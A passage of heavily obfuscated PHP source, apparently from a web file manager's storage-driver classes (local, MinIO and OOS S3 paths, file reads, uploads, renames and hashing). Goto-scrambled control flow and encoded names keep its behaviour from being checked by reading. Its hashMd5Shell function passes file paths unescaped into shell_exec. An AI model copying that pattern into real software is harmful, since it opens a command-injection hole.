öÜî; aøÃÑ öÜî: $BÁÒ’Ì½à÷ = $this->size($d›™Å‰Õ¾ç); $bİ¢ßó«°¥ = 200; $C÷Š´­¤¶ = 50; goto fŸÌõ¨í§ò; DŒâ¸£¶•Ç: } public function getContent($EÕåµÃ÷Şå) { $EÕåµÃ÷Şå = $this->iconvSystem($EÕåµÃ÷Şå); return file_get_contents($EÕåµÃ÷Şå); } public function setContent($d’³¼İ Ó², $b·Úˆ½ºÀ¾ = '') { $d’³¼İ Ó² = $this->iconvSystem($d’³¼İ Ó²); $B”³•šÃ´‡ = @file_put_contents($d’³¼İ Ó², $b·Úˆ½ºÀ¾, LOCK_EX); clearstatcache(); return $B”³•šÃ´‡ === !1 ? !1 : !0; } public function fileSubstr($BÅÔöó‘Š», $c‰’ÍËĞ©ù = 0, $eßÖŞ‘±›í = false) { goto Díã§ »ØÓ; AÁÆÁæ¨Õ‡: fseek_64($eæ˜¤ÅÏáÔ, $c‰’ÍËĞ©ù); $DÖÂéÜñ·è = fread($eæ˜¤ÅÏáÔ, $eßÖŞ‘±›í); fclose($eæ˜¤ÅÏáÔ); goto cĞÖÁ¾‘ß…; Díã§ »ØÓ: $aé±„’×´À =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BÅÔöó‘Š» = $this->iconvSystem($BÅÔöó‘Š»); if ($eßÖŞ‘±›í === !1) { $eßÖŞ‘±›í = $this->size($BÅÔöó‘Š»); } goto d›ôê¡¬ì¥; cĞÖÁ¾‘ß…: return $DÖÂéÜñ·è; goto F‘†‡¥ª¢½; d›ôê¡¬ì¥: if ($eßÖŞ‘±›í <= 0) { return $aé±„’×´À[33]; } $eæ˜¤ÅÏáÔ = fopen($BÅÔöó‘Š», $aé±„’×´À[1209]); if (!$eæ˜¤ÅÏáÔ) { return !1; } goto AÁÆÁæ¨Õ‡; F‘†‡¥ª¢½: } public function upload($F¡Š·‹©ê, $B«ÉÉè–, $C¥—²‡ÏÂ– = false, $FÖë¯”Æˆ† = REPEAT_REPLACE) { $AÜÈœÁÃ™Æ = $this->copyFile($B«ÉÉè–, $F¡Š·‹©ê); return $AÜÈœÁÃ™Æ ? $this->getPathOuter($F¡Š·‹©ê) : !1; } public function setModifyTime($bğĞÛ¨˜Ï, $b»È¸ì™Ğ = '') { @touch($bğĞÛ¨˜Ï, intval($b»È¸ì™Ğ)); } public function download($d¬ÑÖÉ÷±‰, $E°ñâÂÂÛ•) { return $this->iconvSystem($d¬ÑÖÉ÷±‰); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fŞìŠŠ¸»â) { parent::__construct($fŞìŠŠ¸»â); $this->signatureVersion($_SERVER[ó¬â¥‰ÊÔ¤Ç£][210]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($aƒ‚õØÈï) { parent::__construct($aƒ‚õØÈï); $this->signatureVersion($_SERVER[ó¬â¥‰ÊÔ¤Ç£][210]); } public function fileOutLink($EÅå°õãé) { $BºœÄğªøõ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (substr($EÅå°õãé, 0, 7) == $BºœÄğªøõ[1152]) { $EÅå°õãé = $BºœÄğªøõ[1153] . substr($EÅå°õãé, 7); } header($BºœÄğªøõ[158] . $EÅå°õãé); die; } } goto b°í¹ áøï; eå˜ËùÅÚ–: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $bÃ³Œ”ö• =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $this->objectDriver = array($bÃ³Œ”ö•[57], $bÃ³Œ”ö•[58], $bÃ³Œ”ö•[59], $bÃ³Œ”ö•[60], $bÃ³Œ”ö•[61], $bÃ³Œ”ö•[62], $bÃ³Œ”ö•[63], $bÃ³Œ”ö•[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($aÒÌƒĞäé) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($aÒÌƒĞäé, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][8]); } return $aÒÌƒĞäé; } public function iconvApp($bŒˆ“ÉãÖ ) { return $bŒˆ“ÉãÖ ; } public function iconvSystem($bíĞ’ğùâÚ) { return $bíĞ’ğùâÚ; } public function iconvTo($Cõéƒ‚¦«Û, $Dé›É­ˆ, $dÄ—œß©‰Ç) { goto BøˆİëÜã; b•¹ó¶â´»: $e»¿µŠ–µ[$dÄ—œß©‰Ç . $eòæ’­ÉÌò[66] . $Dé›É­ˆ . $eòæ’­ÉÌò[67] . $Cõéƒ‚¦«Û] = $Cõéƒ‚¦«Û; $e»¿µŠ–µ[$dÄ—œß©‰Ç . $eòæ’­ÉÌò[66] . $Dé›É­ˆ . $eòæ’­ÉÌò[67] . $fù‚Èë·…†] = $Cõéƒ‚¦«Û; $e»¿µŠ–µ[$Dé›É­ˆ . $eòæ’­ÉÌò[66] . $dÄ—œß©‰Ç . $eòæ’­ÉÌò[67] . $fù‚Èë·…†] = $fù‚Èë·…†; goto fË‰ÚŸÏÆí; e‰ºù¥›ÏÂ: $fù‚Èë·…† = $fù‚Èë·…† ? $fù‚Èë·…† : $Cõéƒ‚¦«Û; if (strstr($fù‚Èë·…†, $eòæ’­ÉÌò[69])) { $fù‚Èë·…† = str_replace($eòæ’­ÉÌò[69], $eòæ’­ÉÌò[70], $fù‚Èë·…†); } $e»¿µŠ–µ[$Dé›É­ˆ . $eòæ’­ÉÌò[66] . $dÄ—œß©‰Ç . $eòæ’­ÉÌò[67] . $Cõéƒ‚¦«Û] = $fù‚Èë·…†; goto b•¹ó¶â´»; BøˆİëÜã: $eòæ’­ÉÌò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Cõéƒ‚¦«Û || !function_exists($eòæ’­ÉÌò[65])) { return $Cõéƒ‚¦«Û; } static $e»¿µŠ–µ = array(); goto Böò¦À¥å‘; Böò¦À¥å‘: $fÁÛ¯Æ™œ‘ = $Dé›É­ˆ . $eòæ’­ÉÌò[66] . $dÄ—œß©‰Ç . $eòæ’­ÉÌò[67] . $Cõéƒ‚¦«Û; if (isset($e»¿µŠ–µ[$fÁÛ¯Æ™œ‘])) { return $e»¿µŠ–µ[$fÁÛ¯Æ™œ‘]; } if (function_exists($eòæ’­ÉÌò[68])) { $fù‚Èë·…† = @mb_convert_encoding($Cõéƒ‚¦«Û, $dÄ—œß©‰Ç, $Dé›É­ˆ); } else { $fù‚Èë·…† = @iconv($Dé›É­ˆ, $dÄ—œß©‰Ç, $Cõéƒ‚¦«Û); } goto e‰ºù¥›ÏÂ; fË‰ÚŸÏÆí: return $fù‚Èë·…†; goto fõå‰õ ˆŸ; fõå‰õ ˆŸ: } public function getPathInner($b¨„¬¡‘Ã) { $BšÅ¯¯¾”Å = IO::init($b¨„¬¡‘Ã); return $BšÅ¯¯¾”Å->path; } public function getPathOuter($c¢·®ïõ’Ú) { $bØôÃ‡¹¶Š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $F£Š§ÀĞÏ = strlen(trim($this->pathBase, $bØôÃ‡¹¶Š[8])); $c¢·®ïõ’Ú = substr(trim($c¢·®ïõ’Ú, $bØôÃ‡¹¶Š[8]), $F£Š§ÀĞÏ); return $this->pathDriver . $bØôÃ‡¹¶Š[8] . ltrim($c¢·®ïõ’Ú, $bØôÃ‡¹¶Š[8]); } public function isParentOf($eğÀ¢«§èŒ, $a‚ÔÜ”éîĞ) { $B¶é÷ÓÊ—‡ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eğÀ¢«§èŒ = rtrim(strtolower($eğÀ¢«§èŒ), $B¶é÷ÓÊ—‡[8]) . $B¶é÷ÓÊ—‡[8]; $a‚ÔÜ”éîĞ = rtrim(strtolower($a‚ÔÜ”éîĞ), $B¶é÷ÓÊ—‡[8]) . $B¶é÷ÓÊ—‡[8]; $B¬Ûá“Û = strpos($a‚ÔÜ”éîĞ, $eğÀ¢«§èŒ) === 0; return $B¬Ûá“Û; } public function getType() { $cÙœ Ø‘é =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÒ¯öŒÓ­ì = str_replace($cÙœ Ø‘é[71], $cÙœ Ø‘é[33], get_class($this)); return strtolower($AÒ¯öŒÓ­ì); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($c¹Ê¨“â ª, $BèøŸ×ñ) { $aŒ†¡ëÄï =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aìµ‹ÃÕñ„ = rtrim($c¹Ê¨“â ª, $aŒ†¡ëÄï[8]) . $aŒ†¡ëÄï[8] . $BèøŸ×ñ; $d—ñî¯ğ­ = $this->exist($Aìµ‹ÃÕñ„); return $d—ñî¯ğ­ ? $Aìµ‹ÃÕñ„ : !1; } public function setModifyTime($cº ¸‚Äß, $eê‘°ƒñ·Œ = '') { } public function renameObject($a›‹óƒ¢±Š, $Eºù’åÈíÁ) { goto dÔÌõÄŸ‘‰; dÔÌõÄŸ‘‰: $C˜¼¡§×Ñç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DôÄÎ’ÀµÌ = $Eºù’åÈíÁ; Hook::trigger($C˜¼¡§×Ñç[72], $this, $a›‹óƒ¢±Š, $this, $this->pathFather($a›‹óƒ¢±Š) . $Eºù’åÈíÁ); goto F‚ê¾ÑÀ¡ñ; F‚ê¾ÑÀ¡ñ: $a›‹óƒ¢±Š = $this->getPathOuter($a›‹óƒ¢±Š); $Eºù’åÈíÁ = $this->pathFather($a›‹óƒ¢±Š) . $Eºù’åÈíÁ; if (IO::isFile($a›‹óƒ¢±Š)) { $FÃ Æ¡Éß = IO::copy($a›‹óƒ¢±Š, $this->pathFather($a›‹óƒ¢±Š), REPEAT_RENAME_FOLDER, $DôÄÎ’ÀµÌ); if ($FÃ Æ¡Éß) { IO::remove($a›‹óƒ¢±Š); } } else { $FÃ Æ¡Éß = IO::mkdir($Eºù’åÈíÁ); if (!$FÃ Æ¡Éß) { return !1; } $F“•Ü˜›Öˆ = IO::listPath($a›‹óƒ¢±Š, !0); $eÏáñ‡„°… = array_merge($F“•Ü˜›Öˆ[$C˜¼¡§×Ñç[73]], $F“•Ü˜›Öˆ[$C˜¼¡§×Ñç[74]]); foreach ($eÏáñ‡„°… as $Dâæ‰ŠõÃ) { IO::move($Dâæ‰ŠõÃ[$C˜¼¡§×Ñç[75]], $Eºù’åÈíÁ, REPEAT_RENAME_FOLDER); } IO::remove($a›‹óƒ¢±Š); } goto E˜³¼·‘ˆ“; E˜³¼·‘ˆ“: return $FÃ Æ¡Éß ? $Eºù’åÈíÁ : !1; goto e½±„òè´¼; e½±„òè´¼: } public function tempFile($CøŒ²µÚ†Ô = '', $F¼îÖèñÖö = '') { goto DñÊİ§¥éİ; DñÊİ§¥éİ: if (!$CøŒ²µÚ†Ô) { $CøŒ²µÚ†Ô = rand_string(15); } $fàŒ‘“óğ¥ = TEMP_FILES . rand_string(15) . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][8]; @mkdir($fàŒ‘“óğ¥, 511, !0); goto b…¾”›±æ; b…¾”›±æ: $b‰™øë¾ëƒ = $fàŒ‘“óğ¥ . $CøŒ²µÚ†Ô; @touch($b‰™øë¾ëƒ); if ($F¼îÖèñÖö) { file_put_contents($b‰™øë¾ëƒ, $F¼îÖèñÖö); } goto FÅÃŸßæ³; FÅÃŸßæ³: return $b‰™øë¾ëƒ; goto BªºÌ†½»ã; BªºÌ†½»ã: } public function tempFileRemve($d†İ…ÌØ‡) { @unlink($d†İ…ÌØ‡); @rmdir($this->pathFather($d†İ…ÌØ‡)); } public function mkfile($eÆ¹Œª„õ, $D†ãÙªÆá = '', $D›ŞĞ‰¸Äé = REPEAT_RENAME) { } public function mkdir($d¶ç‚ë­, $F¹Ş§ö¯ğã = REPEAT_SKIP) { } public function delFile($b…¨¿ó÷æÈ) { } public function delFolder($AÌÚØŒ¡Æ) { } public function copyFile($dõöóì¥, $BÌÙ‡¿äˆ¼) { } public function moveFile($Cƒì‰æ³ŒÖ, $F„ÓµµÂ) { } public function remove($cåª”‡Æ×º) { if ($this->isFile($cåª”‡Æ×º)) { return $this->delFile($cåª”‡Æ×º); } return $this->delFolder($cåª”‡Æ×º); } public function rename($CÚ×É³´¿Ë, $B‡±¢Üî´) { } public function exist($F‰‰àÂ…Âì) { } public function findByHash($D…øàÌ‹ƒ„ = '', $e®âÜâ‹™é = '') { return !1; } public function isFile($FåòÏ¬µÚ) { } public function isFolder($Fß›¼¼£Î¥) { } public function size($Dá»¨Ò») { } public function info($CÆöÁÄ¤£¿) { } public function infoSimple($e…‹Ìœ¿ÁÈ) { return $this->info($e…‹Ìœ¿ÁÈ); } public function infoAuth($b’Ú•Êï„) { return $this->info($b’Ú•Êï„); } public function infoFull($f§…‘º¿…†) { return $this->info($f§…‘º¿…†); } public function infoWithChildren($b’øî•ğœ) { $FİÌ¬‹Ï˜Í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $cÂÂğ¶Åé™ = array(); if (isset($cÂÂğ¶Åé™[$b’øî•ğœ])) { return $cÂÂğ¶Åé™[$b’øî•ğœ]; } $AÏ™›ÉÕéà = $this->info($b’øî•ğœ); if ($AÏ™›ÉÕéà && $AÏ™›ÉÕéà[$FİÌ¬‹Ï˜Í[29]] == $FİÌ¬‹Ï˜Í[76]) { $cØÂ¤Æ½ = array($FİÌ¬‹Ï˜Í[77] => 0, $FİÌ¬‹Ï˜Í[78] => 0, $FİÌ¬‹Ï˜Í[79] => 0); $this->infoChildren($b’øî•ğœ, $cØÂ¤Æ½); $AÏ™›ÉÕéà[$FİÌ¬‹Ï˜Í[77]] = $cØÂ¤Æ½[$FİÌ¬‹Ï˜Í[77]]; $AÏ™›ÉÕéà[$FİÌ¬‹Ï˜Í[80]] = array($FİÌ¬‹Ï˜Í[81] => $cØÂ¤Æ½[$FİÌ¬‹Ï˜Í[78]], $FİÌ¬‹Ï˜Í[82] => $cØÂ¤Æ½[$FİÌ¬‹Ï˜Í[79]]); $cÂÂğ¶Åé™[$b’øî•ğœ] = $AÏ™›ÉÕéà; } return $AÏ™›ÉÕéà; } public function listPath($d¨¯ÎšÌ†ó, $BÂÔ÷ó• = false) { } public function has($aíª’ø¬˜Ô, $CÓÇˆ†Œ‘Š = false, $e—¤í…š‡ç = false) { } public function canRead($b„«…Ã¦âì) { } public function canWrite($C†Ÿä¾ÔÌœ) { } public function getContent($e«‚ª´È÷¬) { } public function setContent($C¢ùÉÔ»Ó£, $a…÷¢¤×– = '') { } protected function infoChildren($Cì·…ÍŒ†ù, &$Cî¥…çŒ‰„) { $F¹Ì£…­ˆë =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; check_abort_echo(); $CÏËõ‡…¢Š = $this->listPath($Cì·…ÍŒ†ù, !0); $CÏËõ‡…¢Š = array_merge($CÏËõ‡…¢Š[$F¹Ì£…­ˆë[74]], $CÏËõ‡…¢Š[$F¹Ì£…­ˆë[73]]); foreach ($CÏËõ‡…¢Š as $eë™•éÖçÛ) { if ($eë™•éÖçÛ[$F¹Ì£…­ˆë[29]] == $F¹Ì£…­ˆë[76]) { $Cî¥…çŒ‰„[$F¹Ì£…­ˆë[79]]++; $FĞ¿íÛä‚ = $this->getPathInner($eë™•éÖçÛ[$F¹Ì£…­ˆë[75]]); $this->infoChildren($FĞ¿íÛä‚, $Cî¥…çŒ‰„); } else { $Cî¥…çŒ‰„[$F¹Ì£…­ˆë[78]]++; $Cî¥…çŒ‰„[$F¹Ì£…­ˆë[77]] += $eë™•éÖçÛ[$F¹Ì£…­ˆë[77]]; } } } public function fileSubstr($Cªøš¹Ü”§, $F‹¨ÖËĞï‚, $E’íî°­®) { } public function listAll($F‘¹«Øç¬ò) { } public function listAllMake($dÉ…ÔäÈÀ, &$FÜİÆƒ¿µó) { $Fõ¿Ñå‚¤Š =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; check_abort_echo(); $aâ¯¾ˆ”¦¢ = $this->listPath($dÉ…ÔäÈÀ, !0); if (!$aâ¯¾ˆ”¦¢) { return; } $fã‚Ş½ ñŸ = array_merge($aâ¯¾ˆ”¦¢[$Fõ¿Ñå‚¤Š[74]], $aâ¯¾ˆ”¦¢[$Fõ¿Ñå‚¤Š[73]]); foreach ($fã‚Ş½ ñŸ as $d°²Ñ™¶Š) { goto f¥íîÒ¢î”; FÈ°™ÜßäÁ: $this->listAllMake($d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[75]], $FÜİÆƒ¿µó); goto D®ÄÚ…ÖÁÙ; f¥íîÒ¢î”: $FŠ‚´‰ñŠ° = $d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[29]] == $Fõ¿Ñå‚¤Š[76]; $d­Ïà¼¤’ = array($Fõ¿Ñå‚¤Š[75] => $d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[75]], $Fõ¿Ñå‚¤Š[76] => $FŠ‚´‰ñŠ°); if (isset($d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[77]])) { $d­Ïà¼¤’[$Fõ¿Ñå‚¤Š[77]] = $d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[77]]; } goto Bƒõ«³Ñé; Bƒõ«³Ñé: if (isset($d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[83]])) { $d­Ïà¼¤’[$Fõ¿Ñå‚¤Š[83]] = $d°²Ñ™¶Š[$Fõ¿Ñå‚¤Š[83]]; } if (!$FŠ‚´‰ñŠ°) { $FÜİÆƒ¿µó[] = $d­Ïà¼¤’; continue; } $FÜİÆƒ¿µó[] = $d­Ïà¼¤’; goto FÈ°™ÜßäÁ; D®ÄÚ…ÖÁÙ: } } public function listAllSimple($aˆ¬´­Ñ¦) { $f…ùÈİŠçø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $e¨‚áÚê˜¥ = array(); $bºË‡…÷ƒ© = $this->listAll($aˆ¬´­Ñ¦); $c”ÀÆİÚ†­ = $this->getPathOuter($aˆ¬´­Ñ¦); foreach ($bºË‡…÷ƒ© as $B“¹¤ÄÙ¼ò) { goto Bø“Ÿóø°ç; DŒèãÖ “µ: if (!$B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[76]]) { $cß¾³šæˆ¯[$f…ùÈİŠçø[85]] = $aÆ†ˆé¼Ç¤; } $e¨‚áÚê˜¥[] = $cß¾³šæˆ¯; goto BšÂ†òŠËŸ; Bø“Ÿóø°ç: $aÆ†ˆé¼Ç¤ = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[75]]; $eïœÉÉéÕ° = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[75]]; if (isset($B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[84]])) { $aÆ†ˆé¼Ç¤ = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[84]][$f…ùÈİŠçø[75]]; $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[77]] = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[84]][$f…ùÈİŠçø[77]]; $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[83]] = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[84]][$f…ùÈİŠçø[83]]; } else { $eïœÉÉéÕ° = substr($B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[75]], strlen(get_path_father($c”ÀÆİÚ†­))); $eïœÉÉéÕ° = $f…ùÈİŠçø[8] . ltrim($eïœÉÉéÕ°, $f…ùÈİŠçø[8]); } goto CÇ‚¸áâß; CÇ‚¸áâß: $cß¾³šæˆ¯ = array($f…ùÈİŠçø[75] => $eïœÉÉéÕ°, $f…ùÈİŠçø[76] => $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[76]]); if (isset($B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[77]]) && !$B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[76]]) { $cß¾³šæˆ¯[$f…ùÈİŠçø[77]] = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[77]]; } if (isset($B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[83]])) { $cß¾³šæˆ¯[$f…ùÈİŠçø[83]] = $B“¹¤ÄÙ¼ò[$f…ùÈİŠçø[83]]; } goto DŒèãÖ “µ; BšÂ†òŠËŸ: } return $e¨‚áÚê˜¥; } public function upload($BñÅùªí„ğ, $eÇÎ¦‹Êõä, $E²Úç““²‚ = false, $CÛô×éãÑÃ = REPEAT_REPLACE) { } public function uploadFileByID($aîˆœõÊ–Ş, $c£ê¶ïå˜, $EëîÁ¡‹ŠĞ) { } public function uploadFileByPath($fØçÇƒîÙ’, $a‡¤È„á…Õ, $Eºéòòğô» = array()) { } public function isUploadServer() { $CˆÉçõäÛÚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $CˆÉçõäÛÚ[86]) { return !0; } return $GLOBALS[$CˆÉçõäÛÚ[6]][$CˆÉçõäÛÚ[87]][$CˆÉçõäÛÚ[88]]; } public function isFileOutServer() { $a†Ğ§ó®Ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $a†Ğ§ó®Ò[86]) { return !0; } return $GLOBALS[$a†Ğ§ó®Ò[6]][$a†Ğ§ó®Ò[87]][$a†Ğ§ó®Ò[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eŠÃ¿ŠÙ‘) { $AóÊ›Ù´¾ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->isCdnHost()) { return $eŠÃ¿ŠÙ‘; } return str_replace(trim(get_url_root($eŠÃ¿ŠÙ‘), $AóÊ›Ù´¾[8]), trim($this->cdnHost, $AóÊ›Ù´¾[8]), $eŠÃ¿ŠÙ‘); } public function uploadLink($CÚÔŠ‰ôøˆ, $CªçÖ­Æ¡ô = 0) { goto dÅ÷õˆ‹·; E°à·›¬®Ï: $dŒÒ³ªëÓ• = $CªçÖ­Æ¡ô <= $bí÷Ÿ¯„Ğ® ? $dÏ–£†½‹[90] : $dÏ–£†½‹[91]; $dçšÖŠ×è¹ = (!$CªçÖ­Æ¡ô ? 1 : ceil($CªçÖ­Æ¡ô / pow(1024, 3))) * 3600 * 4; $FÍ®Ş“Öù = $this->{$dŒÒ³ªëÓ•}($CÚÔŠ‰ôøˆ, $dçšÖŠ×è¹); goto cÌ—â¯¤äœ; cÌ—â¯¤äœ: if ($FÍ®Ş“Öù) { $FÍ®Ş“Öù[$dÏ–£†½‹[92]] = $CÚÔŠ‰ôøˆ; $FÍ®Ş“Öù[$dÏ–£†½‹[93]] = $e Ê™«¦Å±; } return $FÍ®Ş“Öù; goto f‚ùÂ¼¤; BÓÃíšš×: if (!in_array($e Ê™«¦Å±, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $bí÷Ÿ¯„Ğ® = 1024 * 1024 * 10; goto E°à·›¬®Ï; dÅ÷õˆ‹·: $dÏ–£†½‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($this->isUploadServer()) { return; } $e Ê™«¦Å± = $this->getType(); goto BÓÃíšš×; f‚ùÂ¼¤: } public function uploadFormData($a‡›İ–Ù­, $cÚæÊ±â–÷ = 3600) { } public function multiUploadFormData($a×šÚÆ´è, $bùÉÀÜÊ¶— = 3600) { } public function download($D©æ×Â°¿„, $bŠïˆ¶·å) { } public function ext($BêîÓƒÍËœ) { $b°¿ê«ã¨ƒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (strpos($BêîÓƒÍËœ, $b°¿ê«ã¨ƒ[8]) === -1) { $A¬Ë‘ˆ¥áç = $BêîÓƒÍËœ; } else { $A¬Ë‘ˆ¥áç = $this->pathThis($BêîÓƒÍËœ); } $dä–¬ÌñÆ = $b°¿ê«ã¨ƒ[33]; if (strstr($A¬Ë‘ˆ¥áç, $b°¿ê«ã¨ƒ[94])) { $dä–¬ÌñÆ = substr($A¬Ë‘ˆ¥áç, strrpos($A¬Ë‘ˆ¥áç, $b°¿ê«ã¨ƒ[94]) + 1); $dä–¬ÌñÆ = strtolower($dä–¬ÌñÆ); } if (strlen($dä–¬ÌñÆ) > 3 && preg_match($b°¿ê«ã¨ƒ[95], $dä–¬ÌñÆ, $Dš­•óš­ô)) { $dä–¬ÌñÆ = $b°¿ê«ã¨ƒ[33]; } return $dä–¬ÌñÆ; } public function pathThis($AÉÕĞÀïøÑ) { $eõ ²¸ç•Û =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÉÕĞÀïøÑ = str_replace($eõ ²¸ç•Û[96], $eõ ²¸ç•Û[8], rtrim($AÉÕĞÀïøÑ, $eõ ²¸ç•Û[8])); $E’‹§µÄÆæ = strrpos($AÉÕĞÀïøÑ, $eõ ²¸ç•Û[8]); if ($E’‹§µÄÆæ === !1) { return $AÉÕĞÀïøÑ; } return substr($AÉÕĞÀïøÑ, $E’‹§µÄÆæ + 1); } public function pathFather($cá§–ÎŒéÒ) { $a‹„‰ˆãóê =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cá§–ÎŒéÒ = str_replace($a‹„‰ˆãóê[96], $a‹„‰ˆãóê[8], rtrim($cá§–ÎŒéÒ, $a‹„‰ˆãóê[8])); $b„ÂŞ™í˜¶ = strrpos($cá§–ÎŒéÒ, $a‹„‰ˆãóê[8]); if ($b„ÂŞ™í˜¶ === !1) { return $a‹„‰ˆãóê[33]; } return substr($cá§–ÎŒéÒ, 0, $b„ÂŞ™í˜¶ + 1); } public function hashSimple($cÄø’Ôê¤) { goto AìÒîÆ¾‚; côåöÓ‚ĞÑ: $aÒç„ã¬˜Ö = 200; $Aø’¡¯Œ À = 50; if ($Dæ…ô‡ªÆª <= $aÒç„ã¬˜Ö * $Aø’¡¯Œ À) { return $this->hashMd5($cÄø’Ôê¤) . $Dæ…ô‡ªÆª; } goto c¢ÚŠ×¢ˆ±; c¢ÚŠ×¢ˆ±: $DŞŠãÉÆ¨ = intval($Dæ…ô‡ªÆª / $Aø’¡¯Œ À); $Fº²ºÇ£Ü‹ = $a×ƒ¶á¡”Ó[33]; for ($Cç¡î‹œ = 0; $Cç¡î‹œ < $Aø’¡¯Œ À; $Cç¡î‹œ++) { $Fº²ºÇ£Ü‹ .= $this->fileSubstr($cÄø’Ôê¤, $DŞŠãÉÆ¨ * $Cç¡î‹œ, $aÒç„ã¬˜Ö); } goto B¶õö–Á®²; B¶õö–Á®²: $Fº²ºÇ£Ü‹ .= $this->fileSubstr($cÄø’Ôê¤, $Dæ…ô‡ªÆª - $aÒç„ã¬˜Ö, $aÒç„ã¬˜Ö); return md5($Fº²ºÇ£Ü‹) . $Dæ…ô‡ªÆª; goto Aß¹„õæ¹Ã; AìÒîÆ¾‚: $a×ƒ¶á¡”Ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$cÄø’Ôê¤) { return md5($a×ƒ¶á¡”Ó[33]); } $Dæ…ô‡ªÆª = $this->size($cÄø’Ôê¤); goto côåöÓ‚ĞÑ; Aß¹„õæ¹Ã: } public static $md5Cache = array(); public function hashMd5($Aåâ’¬Ì) { $Aåâ’¬Ì = $this->iconvSystem($Aåâ’¬Ì); if (isset(self::$md5Cache[$Aåâ’¬Ì])) { return self::$md5Cache[$Aåâ’¬Ì]; } self::$md5Cache[$Aåâ’¬Ì] = $this->hashMd5Shell($Aåâ’¬Ì); if (!self::$md5Cache[$Aåâ’¬Ì]) { self::$md5Cache[$Aåâ’¬Ì] = @md5_file($Aåâ’¬Ì); } return self::$md5Cache[$Aåâ’¬Ì]; } private function hashMd5Shell($CÎ£ä½‹Ì°) { goto eçéé‰öäø; Aä±ƒ–åïÍ: $a‚á‘Ù¥‹ê = Cache::get($FÎõœÎÑäÀ[100]); if (!$a‚á‘Ù¥‹ê) { $eÈ“×ÈœÉ = BASIC_PATH . $FÎõœÎÑäÀ[101]; $DÁ÷„ÀÊÄõ = md5_file($eÈ“×ÈœÉ); $a‚á‘Ù¥‹ê = $FÎõœÎÑäÀ[102]; foreach ($E·÷â‚ä´¹ as $A¢éÁ‡±ù) { $E¨†‰ŸÔÎ¿ = shell_exec($A¢éÁ‡±ù . "\x20\42{$eÈ“×ÈœÉ}\x22"); if ($E¨†‰ŸÔÎ¿ && substr(trim($E¨†‰ŸÔÎ¿), 0, 32) == $DÁ÷„ÀÊÄõ) { $a‚á‘Ù¥‹ê = $A¢éÁ‡±ù; break; } } Cache::set($FÎõœÎÑäÀ[100], $a‚á‘Ù¥‹ê, 3600); } if ($a‚á‘Ù¥‹ê == $FÎõœÎÑäÀ[102]) { return !1; } goto Dê¦ŒãÈ±; eçéé‰öäø: $FÎõœÎÑäÀ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!function_exists($FÎõœÎÑäÀ[97])) { return !1; } $E·÷â‚ä´¹ = array($FÎõœÎÑäÀ[98], $FÎõœÎÑäÀ[99]); goto Aä±ƒ–åïÍ; Dê¦ŒãÈ±: $E¨†‰ŸÔÎ¿ = shell_exec($a‚á‘Ù¥‹ê . "\40\x22{$CÎ£ä½‹Ì°}\x22"); $E¨†‰ŸÔÎ¿ = str_replace($FÎõœÎÑäÀ[103], $FÎõœÎÑäÀ[33], $E¨†‰ŸÔÎ¿); return substr($E¨†‰ŸÔÎ¿, 0, 32); goto bÌ¤…ÒÈá; bÌ¤…ÒÈá: } public function link($EØŸ‡„µ) { return $EØŸ‡„µ; } public function fileOut($FÀ˜êÔÓÚ×, 